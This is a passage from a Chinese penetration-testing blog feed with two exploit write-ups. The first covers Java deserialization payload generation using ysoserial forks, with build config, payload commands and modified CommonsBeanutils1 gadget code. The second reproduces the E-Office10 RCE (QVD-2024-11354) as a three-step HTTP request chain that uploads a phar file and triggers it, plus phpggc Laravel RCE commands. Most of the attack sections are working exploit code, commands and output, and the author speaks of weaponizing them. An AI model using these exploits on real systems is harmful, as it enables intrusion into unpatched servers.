tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.apache.maven.plugins<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>maven-compiler-plugin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>3.5.1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>configuration</span><span class="token punctuation">></span></span><span class="token comment">&lt;!-- maximize compatibility --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>source</span><span class="token punctuation">></span></span>1.5<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>source</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>target</span><span class="token punctuation">></span></span>1.5<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>target</span><span class="token punctuation">></span></span><span class="token comment">&lt;!-- ignore noisy internal api warnings --></span>                   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>compilerArgument</span><span class="token punctuation">></span></span>-XDignore.symbol.file<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>compilerArgument</span><span class="token punctuation">></span></span>                   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>fork</span><span class="token punctuation">></span></span>true<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>fork</span><span class="token punctuation">></span></span>               <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>configuration</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>plugin</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>plugin</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>maven-assembly-plugin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>configuration</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>finalName</span><span class="token punctuation">></span></span>$&#123;project.artifactId&#125;-$&#123;project.version&#125;-all<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>finalName</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>appendAssemblyId</span><span class="token punctuation">></span></span>false<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>appendAssemblyId</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>archive</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>manifest</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mainClass</span><span class="token punctuation">></span></span>me.gv7.woodpecker.yso.GeneratePayload<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mainClass</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>manifest</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>archive</span><span class="token punctuation">></span></span>                   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>descriptor</span><span class="token punctuation">></span></span>assembly.xml<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>descriptor</span><span class="token punctuation">></span></span>               <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>configuration</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>executions</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>execution</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">></span></span>make-assembly<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>phase</span><span class="token punctuation">></span></span>package<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>phase</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>goals</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>goal</span><span class="token punctuation">></span></span>assembly<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>goal</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>goals</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>execution</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>executions</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>plugin</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>plugin</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.apache.maven.plugins<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>maven-surefire-plugin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>               <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>3.0.0-M1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>configuration</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>trimStackTrace</span><span class="token punctuation">></span></span>false<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>trimStackTrace</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>systemPropertyVariables</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>java.rmi.server.useCodebaseOnly</span><span class="token punctuation">></span></span>false<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>java.rmi.server.useCodebaseOnly</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>systemPropertyVariables</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>configuration</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>plugin</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>plugins</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>build</span><span class="token punctuation">></span></span></code></pre><p><strong>加上这个这个是重点&lt;defaultGoal&gt;compile&lt;&#x2F;defaultGoal&gt;</strong><br>修改依赖<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202404291745953.png" alt="mvn修改依赖"><br>跳过测试编译(不会maven的去百度搜索一下maven配置设置本地 jar包库)<br>mvn clean package -DskipTests<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202404291747535.png" alt="编译成功"><br>我们重新生成exp<br>java -jar ysoserial-for-woodpecker-0.5.3-all.jar -g CommonsBeanutils1 -a raw_cmd:”ping xxxx”  –dirt-data-length 400000 &gt;curl4.cer<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202404291750918.png" alt="打成功了"><br>我们收到了请求打成功了现在重要的是我们是不是也可以生成一波回显。啥的我们在找到了一个工具那就是这个 su18大佬的工具<br><a href="https://github.com/peiqiF4ck/ysoserial">https://github.com/peiqiF4ck/ysoserial</a><br>修改jar包配置并且编译。<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202404301115542.png" alt="修改jar包配置"><br>build 成功我们使用这个来生成exp<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202404301118540.png" alt="build成功"><br>java -jar ysuserial-1.5-su18-all.jar -g CommonsBeanutils1 -p “EX-TomcatEcho” -ch “su18” -dt 3 -dl 400000 &gt;su18.bin<br>ok直接一发入魂<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202404301121736.png" alt="复现完毕"><br>后来有尝试了几款工具。这两款工具里面的CommonsBeanutils1.java里面的代码都被改了只适用于高版本的CommonsBeanutils 。如果想用我们需要改改里面的代码</br><br><a href="https://github.com/qi4L/JYso">https://github.com/qi4L/JYso</a> (<strong>这个修改代码不可以使用并且和作者讨论了一下这个项目中代码存在bug。低版本的即使修改代码也很难使用另外这个gradle不好编译等作者更新代码吧。后续我会写一波这个项目的编译方法。项目不错。作者格局很大。不知道作者修改什么了不兼容低版本的CommonsBeanutils。到时候代码修改了。我会写一篇文章专门编译这个因为这个gradle这个不好编译。我也是在这个项目上踩坑踩了至少2天哈哈哈一言难尽啊所以后续出教程不让你们踩坑</strong>)<br><a href="https://github.com/Gary-yang1/JYso(%E8%BF%99%E4%B8%AA%E4%BF%AE%E6%94%B9%E4%BB%A3%E7%A0%81%E5%8F%AF%E4%BB%A5%E7%9B%B4%E6%8E%A5%E4%BD%BF%E7%94%A8,%E6%8D%AE%E8%AF%B4%E8%BF%99%E6%98%AF%E4%B9%8B%E5%89%8D%E7%9A%84%E8%BF%99%E4%B8%AA%E9%A1%B9%E7%9B%AEhttps://github.com/qi4L/JYso%E7%9A%84%E4%BB%A3%E7%A0%81%E3%80%82)">https://github.com/Gary-yang1/JYso(这个修改代码可以直接使用,据说这是之前的这个项目https://github.com/qi4L/JYso的代码。)</a><br>我贴一下修改后的代码<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202404301134828.png" alt="修改部分"></p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>qi4l<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span>gadgets</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>qi4l<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span>enumtypes<span class="token punctuation">.</span></span><span class="token class-name">PayloadType</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>qi4l<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span>gadgets<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Authors</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>qi4l<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span>gadgets<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Dependencies</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>qi4l<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span>gadgets<span class="token punctuation">.</span>utils<span class="token punctuation">.</span></span><span class="token class-name">Gadgets</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>qi4l<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span>gadgets<span class="token punctuation">.</span>utils<span class="token punctuation">.</span></span><span class="token class-name">GadgetsYso</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>qi4l<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span>gadgets<span class="token punctuation">.</span>utils<span class="token punctuation">.</span></span><span class="token class-name">Reflections</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>beanutils<span class="token punctuation">.</span></span><span class="token class-name">BeanComparator</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">PriorityQueue</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>math<span class="token punctuation">.</span></span><span class="token class-name">BigInteger</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token keyword">static</span> <span class="token namespace">com<span class="token punctuation">.</span>qi4l<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span></span><span class="token class-name">Starter<span class="token punctuation">.</span>JYsoMode</span><span class="token punctuation">;</span><span class="token annotation punctuation">@SuppressWarnings</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"rawtypes"</span><span class="token punctuation">,</span> <span class="token string">"unchecked"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token annotation punctuation">@Dependencies</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"commons-beanutils:commons-beanutils:1.6.1"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token annotation punctuation">@Authors</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token class-name">Authors</span><span class="token punctuation">.</span>FROHOFF<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> commonsbeanutils1 <span class="token keyword">implements</span> <span class="token class-name">ObjectPayload</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">></span></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">getObject</span><span class="token punctuation">(</span><span class="token class-name">PayloadType</span> type<span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> param<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>       <span class="token comment">// final Object template;</span>        <span class="token comment">/* if (JYsoMode.contains("yso")) &#123;            template = GadgetsYso.createTemplatesImpl(param[0]);        &#125; else &#123;            template = Gadgets.createTemplatesImpl(type, param);        &#125; */</span><span class="token keyword">final</span> <span class="token class-name">Object</span> template <span class="token operator">=</span> <span class="token class-name">GadgetsYso</span><span class="token punctuation">.</span><span class="token function">createTemplatesImpl</span><span class="token punctuation">(</span>param<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment">// final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);</span><span class="token keyword">final</span> <span class="token class-name">BeanComparator</span> comparator <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BeanComparator</span><span class="token punctuation">(</span><span class="token string">"lowestSetBit"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">final</span> <span class="token class-name">PriorityQueue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">></span></span> queue <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PriorityQueue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> comparator<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">/* queue.add("1");        queue.add("1"); */</span>queue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">BigInteger</span><span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>queue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">BigInteger</span><span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Reflections</span><span class="token punctuation">.</span><span class="token function">setFieldValue</span><span class="token punctuation">(</span>comparator<span class="token punctuation">,</span> <span class="token string">"property"</span><span class="token punctuation">,</span> <span class="token string">"outputProperties"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Reflections</span><span class="token punctuation">.</span><span class="token function">setFieldValue</span><span class="token punctuation">(</span>queue<span class="token punctuation">,</span> <span class="token string">"queue"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>template<span class="token punctuation">,</span> template<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> queue<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>执行编译,然后进行测试。编译成功我们来测试<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202404301141993.png" alt="编译成功"><br>java -jar JYso-3.5.7.jar -yso 1 -g  CommonsBeanutils1  -p “EX-TomcatEcho”  -ch “yso357” -dt 3 -dl 400000 &gt;yso3577.bin<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202404301148222.png" alt="成功复现"></p><h2 id="自动化武器化"><a href="#自动化武器化" class="headerlink" title="自动化武器化"></a>自动化武器化</h2><p>上述既然我们成功构造出payload那我们可以直接进行武器化集成到我们的工具里面。对这个漏洞进行检测。利用截图<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202404301522728.png" alt="利用截图"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>后续等Jyso作者更新代码以后我将专门出一篇文章编译Jyso最新版本。后续在github中一类的项目都放到一块方便操作。</p>]]></content>
      
      
      <categories>
          
          <category> PenetrationTest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PenetrationTestingExample </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>QVD-2024-11354-最新泛微E-Office10远程代码执行漏洞(复现坑点总结)</title>
      <link href="/penetrationtest/2024/03/articles/b8f9d080e95e9930/"/>
      <url>/penetrationtest/2024/03/articles/b8f9d080e95e9930/</url>
      
        <content type="html"><![CDATA[<h2 id="漏洞复现背景"><a href="#漏洞复现背景" class="headerlink" title="漏洞复现背景"></a>漏洞复现背景</h2><p>前几天突然某公众号发布了泛微的E-office远程代码执行。机缘巧合情况下获取到了这个漏洞的poc。遗憾的是这个漏洞是反序列化的漏洞如果执行其他命令或者getshell需要替换里面的字节。由于他们使用的yakit 漏洞poc使用base64编码。想要搞其实花点时间使用代码解密这段base64并且使用二进制方式写入.phar 文件。就行了。始终觉得自己搞出来那才是最好的于是我分析了一下这段poc的关键代码使用谷歌搜索了一篇文章。走到这里你们肯定想问是哪篇文章。加入小密圈或者内部群获取哈哈哈开玩笑的了。但是这年头分享exp poc需要冒着及大的风险。另外别人研究了可能好几个月的知识被你直接分享那有点说不过去了。收费也是没毛病的。但是这里我就直接分享了毕竟这个漏洞折磨了很久。参考链接:这篇里面有生成poc的代码具体是哪个自己找如果这都搞不定那我就不说了 <a href="https://xz.aliyun.com/t/8359">https://xz.aliyun.com/t/8359</a><br>另外在github有一个类似于java反序列化生成的工具链接在这里<br><a href="https://github.com/ambionics/phpggc">https://github.com/ambionics/phpggc</a> 但我用这个生成的poc不行不知道(原因校验phar hash值)。这个在kali上面运行生成poc就行了<br/><br>用法：php phpggc -p phar Laravel&#x2F;RCE1 system whoami  -b</p><p>补充一下生成带图片头的语法 下面这个语法满足要求 使用laravel 版本小于5.8.x的exp就行了<br>php phpggc -pp up.gif -p phar -o u.phar Laravel&#x2F;RCE1 system dir </p><p>我是用<a href="https://xz.aliyun.com/t/8359">https://xz.aliyun.com/t/8359</a> 生成的poc</p><h2 id="漏洞poc"><a href="#漏洞poc" class="headerlink" title="漏洞poc"></a>漏洞poc</h2><p>第一步 上传带有反序列化的文件 poc</p><pre class="language-java" data-language="java"><code class="language-java">POST <span class="token operator">/</span>eoffice10<span class="token operator">/</span>server<span class="token operator">/</span><span class="token keyword">public</span><span class="token operator">/</span>api<span class="token operator">/</span>attachment<span class="token operator">/</span>atuh<span class="token operator">-</span>file HTTP<span class="token operator">/</span><span class="token number">1.1</span><span class="token class-name">Host</span><span class="token operator">:</span> xxxxxxxxxx<span class="token class-name">User</span><span class="token operator">-</span><span class="token class-name">Agent</span><span class="token operator">:</span> <span class="token class-name">Mozilla</span><span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span><span class="token class-name">Windows</span> NT <span class="token number">10.0</span><span class="token punctuation">;</span> <span class="token class-name">Win64</span><span class="token punctuation">;</span> x64<span class="token punctuation">)</span> <span class="token class-name">AppleWebKit</span><span class="token operator">/</span><span class="token number">537.36</span> <span class="token punctuation">(</span>KHTML<span class="token punctuation">,</span> like <span class="token class-name">Gecko</span><span class="token punctuation">)</span> <span class="token class-name">Chrome</span><span class="token operator">/</span><span class="token number">72.0</span><span class="token number">.3626</span><span class="token number">.121</span> <span class="token class-name">Safari</span><span class="token operator">/</span><span class="token number">537.36</span><span class="token class-name">Content</span><span class="token operator">-</span><span class="token class-name">Length</span><span class="token operator">:</span> <span class="token number">536</span><span class="token class-name">Accept</span><span class="token operator">:</span> text<span class="token operator">/</span>html<span class="token punctuation">,</span> image<span class="token operator">/</span>gif<span class="token punctuation">,</span> image<span class="token operator">/</span>jpeg<span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">;</span> q<span class="token operator">=</span><span class="token number">.2</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token comment">/*; q=.2Connection: closeContent-Type: multipart/form-data; boundary=dsfdsafdsffdsafdsfdfsdf--dsfdsafdsffdsafdsfdfsdfContent-Disposition: form-data; name="Filedata"; filename="register.inc"Content-Type: image/jpegGIF89a&lt;?php __HALT_COMPILER(); ?> //whoami.phar--dsfdsafdsffdsafdsfdfsdf--返回包HTTP/1.1 200 OKDate: Sat, 30 Mar 2024 08:15:43 GMTServer: ApacheCache-Control: no-cache, privateVary: Accept-EncodingConnection: closeContent-Type: application/jsonContent-Length: 123&#123;"status":1,"data":&#123;"attachment_id":"idid","attachment_name":"register.inc"&#125;,"runtime":"2.361"&#125;</span></code></pre><p>第二步触发反序列化</p><pre class="language-java" data-language="java"><code class="language-java">POST <span class="token operator">/</span>eoffice10<span class="token operator">/</span>server<span class="token operator">/</span><span class="token keyword">public</span><span class="token operator">/</span>api<span class="token operator">/</span>attachment<span class="token operator">/</span>path<span class="token operator">/</span>migrate HTTP<span class="token operator">/</span><span class="token number">1.1</span><span class="token class-name">Host</span><span class="token operator">:</span> xxxxx<span class="token class-name">User</span><span class="token operator">-</span><span class="token class-name">Agent</span><span class="token operator">:</span> <span class="token class-name">Mozilla</span><span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span><span class="token class-name">Windows</span> NT <span class="token number">10.0</span><span class="token punctuation">;</span> <span class="token class-name">Win64</span><span class="token punctuation">;</span> x64<span class="token punctuation">)</span> <span class="token class-name">AppleWebKit</span><span class="token operator">/</span><span class="token number">537.36</span> <span class="token punctuation">(</span>KHTML<span class="token punctuation">,</span> like <span class="token class-name">Gecko</span><span class="token punctuation">)</span> <span class="token class-name">Chrome</span><span class="token operator">/</span><span class="token number">72.0</span><span class="token number">.3626</span><span class="token number">.121</span> <span class="token class-name">Safari</span><span class="token operator">/</span><span class="token number">537.36</span><span class="token class-name">Content</span><span class="token operator">-</span><span class="token class-name">Length</span><span class="token operator">:</span> <span class="token number">69</span><span class="token class-name">Connection</span><span class="token operator">:</span> close<span class="token class-name">Content</span><span class="token operator">-</span><span class="token class-name">Type</span><span class="token operator">:</span> application<span class="token operator">/</span>x<span class="token operator">-</span>www<span class="token operator">-</span>form<span class="token operator">-</span>urlencodedsource_path<span class="token operator">=</span><span class="token operator">&amp;</span>desc_path<span class="token operator">=</span>phar<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">2F</span><span class="token operator">%</span><span class="token number">2F</span><span class="token punctuation">.</span><span class="token punctuation">.</span>%<span class="token number">2F</span><span class="token punctuation">.</span><span class="token punctuation">.</span>%<span class="token number">2F</span><span class="token punctuation">.</span><span class="token punctuation">.</span>%<span class="token number">2F</span><span class="token punctuation">.</span><span class="token punctuation">.</span>%<span class="token number">2F</span>attachment<span class="token operator">%</span><span class="token number">2F</span>返回HTTP<span class="token operator">/</span><span class="token number">1.1</span> <span class="token number">200</span> OK<span class="token class-name">Date</span><span class="token operator">:</span> <span class="token class-name">Sat</span><span class="token punctuation">,</span> <span class="token number">30</span> <span class="token class-name">Mar</span> <span class="token number">2024</span> <span class="token number">08</span><span class="token operator">:</span><span class="token number">15</span><span class="token operator">:</span><span class="token number">51</span> GMT<span class="token class-name">Server</span><span class="token operator">:</span> <span class="token class-name">Apache</span><span class="token class-name">Cache</span><span class="token operator">-</span><span class="token class-name">Control</span><span class="token operator">:</span> no<span class="token operator">-</span>cache<span class="token punctuation">,</span> <span class="token keyword">private</span><span class="token class-name">Vary</span><span class="token operator">:</span> <span class="token class-name">Accept</span><span class="token operator">-</span><span class="token class-name">Encoding</span><span class="token class-name">Connection</span><span class="token operator">:</span> close<span class="token class-name">Content</span><span class="token operator">-</span><span class="token class-name">Type</span><span class="token operator">:</span> application<span class="token operator">/</span>json<span class="token class-name">Content</span><span class="token operator">-</span><span class="token class-name">Length</span><span class="token operator">:</span> <span class="token number">85</span><span class="token punctuation">&#123;</span><span class="token string">"status"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">"data"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"runtime"</span><span class="token operator">:</span><span class="token string">"0.342"</span><span class="token punctuation">&#125;</span></code></pre><p>第三步:执行得到结果</p><pre class="language-java" data-language="java"><code class="language-java">POST <span class="token operator">/</span>eoffice10<span class="token operator">/</span>server<span class="token operator">/</span><span class="token keyword">public</span><span class="token operator">/</span>api<span class="token operator">/</span>empower<span class="token operator">/</span><span class="token keyword">import</span> HTTP<span class="token operator">/</span><span class="token number">1.1</span><span class="token class-name">Host</span><span class="token operator">:</span> xxxxxxxxxxxx<span class="token class-name">User</span><span class="token operator">-</span><span class="token class-name">Agent</span><span class="token operator">:</span> <span class="token class-name">Mozilla</span><span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span><span class="token class-name">Windows</span> NT <span class="token number">10.0</span><span class="token punctuation">;</span> <span class="token class-name">Win64</span><span class="token punctuation">;</span> x64<span class="token punctuation">)</span> <span class="token class-name">AppleWebKit</span><span class="token operator">/</span><span class="token number">537.36</span> <span class="token punctuation">(</span>KHTML<span class="token punctuation">,</span> like <span class="token class-name">Gecko</span><span class="token punctuation">)</span> <span class="token class-name">Chrome</span><span class="token operator">/</span><span class="token number">72.0</span><span class="token number">.3626</span><span class="token number">.121</span> <span class="token class-name">Safari</span><span class="token operator">/</span><span class="token number">537.36</span><span class="token class-name">Content</span><span class="token operator">-</span><span class="token class-name">Length</span><span class="token operator">:</span> <span class="token number">49</span><span class="token class-name">Connection</span><span class="token operator">:</span> close<span class="token class-name">Content</span><span class="token operator">-</span><span class="token class-name">Type</span><span class="token operator">:</span> application<span class="token operator">/</span>x<span class="token operator">-</span>www<span class="token operator">-</span>form<span class="token operator">-</span>urlencodedfile<span class="token operator">=</span>idididi <span class="token comment">//这里也可以加到干扰字符例如username=admin&amp;password=admin&amp;file=dfdsfdsfdsf&amp;type=login</span>HTTP<span class="token operator">/</span><span class="token number">1.1</span> <span class="token number">200</span> OK<span class="token class-name">Date</span><span class="token operator">:</span> <span class="token class-name">Sat</span><span class="token punctuation">,</span> <span class="token number">30</span> <span class="token class-name">Mar</span> <span class="token number">2024</span> <span class="token number">08</span><span class="token operator">:</span><span class="token number">22</span><span class="token operator">:</span><span class="token number">39</span> GMT<span class="token class-name">Server</span><span class="token operator">:</span> <span class="token class-name">Apache</span><span class="token class-name">Cache</span><span class="token operator">-</span><span class="token class-name">Control</span><span class="token operator">:</span> no<span class="token operator">-</span>cache<span class="token punctuation">,</span> <span 